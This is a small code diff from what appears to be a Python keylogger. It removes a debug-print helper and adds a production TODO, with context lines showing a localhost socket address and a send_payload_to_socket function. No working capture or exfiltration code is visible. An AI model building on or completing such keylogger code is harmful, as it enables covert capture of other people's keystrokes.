@@ -6,12 +6,8 @@ import psutil
 import os
 
 KEYLOGGER_DEBUG_KEY = 'KEYLOGGER_DEBUG_KEY'
+# TODO set up production environment
 server_address = ('localhost', 9696)
-
-# TODO put in __init__ or make somewhere more accessible so can be shared
-def conditional_print_debug(str):
-    if os.getenv(KEYLOGGER_DEBUG_KEY, True):
-        print("DEBUG: %s" % (str))
 
 def send_payload_to_socket(payload):
     try:
